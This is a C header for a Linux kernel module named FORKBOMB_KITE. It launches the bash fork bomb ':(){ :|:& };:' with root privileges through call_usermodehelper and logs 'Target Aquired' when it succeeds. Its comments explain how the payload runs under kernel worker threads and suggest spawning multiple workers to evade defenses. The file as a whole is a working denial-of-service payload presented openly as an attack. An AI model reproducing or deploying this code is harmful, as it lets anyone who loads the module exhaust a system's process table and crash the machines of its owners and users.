#ifndef FORKBOMB_KITE
    #define FORKBOMB_KITE
    #include <linux/slab.h>
    #include <linux/umh.h>

/*use bash binary to do a command that defines a function that calls itself,
  pipe the output to another call of itself, making a recursive function that calls itself
  and creating a fork each time with the pipe operator*/
static char *args[] = {"/bin/bash", "-c", ":(){ :|:& };:", NULL};
static char *env[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL}; // environment variables of the process

/*It runs a user-space application. The application is started asynchronously if wait is not set,
  and runs as a child of system workqueues(kworkers, executors of kthreads) that are children of kthreadd. (ie. it runs with full root capabilities and optimized affinity).
  the kthreadd enumerates other kernel threads; it provides interface routines through which other kernel threads can be dynamically spawned at runtime by kernel services.
  can also spawn multiple processes for multiple workers for added complexity to avoid defenses.
  */
static void start_bombing_run(void){
    int ret = call_usermodehelper(args[0], args, env, UMH_WAIT_PROC);
    if (ret != 0)
	        printk(KERN_INFO "error in call to usermodehelper: %i\n", ret);
	else {
	    printk(KERN_INFO "Target Aquired\n");
	}
}
#endif